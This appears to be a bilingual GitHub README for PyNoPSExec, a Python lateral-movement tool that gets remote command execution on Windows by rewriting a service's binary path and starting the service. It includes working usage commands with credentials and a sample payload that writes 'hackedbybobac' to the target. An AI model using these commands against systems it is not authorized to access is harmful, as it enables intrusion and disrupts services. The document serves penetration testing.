# PyNoPSExec
**A Lateral Movement Tool Learned From SharpNoPSExec  --  Twitter: @juliourena  根据@juliourena大神的SharpNOPsExec项目改写的横向移动工具** 
+ Platform(平台): Windows 10
+ Language(语言): Python2
## 原理简介  
**通过修改服务启动的二进制文件路径，然后启动服务来执行，对服务的要求是：**
+ 没有运行的手动启动或禁止启动的服务
+ 服务没有依赖项
+ 该脚本没有提供服务二进制文件路径恢复功能，需要先记好对应路径，然后可以再次运行该脚本进行恢复，避免服务出问题
## 使用方法  


```bash
net use \\192.168.23.107 "TestPassword@123" /user:testuser
python PyNoPSexec.py  -t 192.168.23.107 -u testuser -p "TestPassword@123" -d test.sec.com -s AppMgmt -e "c:\\windows\\system32\\cmd.exe /c echo hackedbybobac > c:\\bobac.txt"
```
![image](https://user-images.githubusercontent.com/11972644/117527553-82264700-afff-11eb-9850-45ecbd997f98.png)
![image](https://user-images.githubusercontent.com/11972644/117527633-0bd61480-b000-11eb-955e-d8310d463090.png)


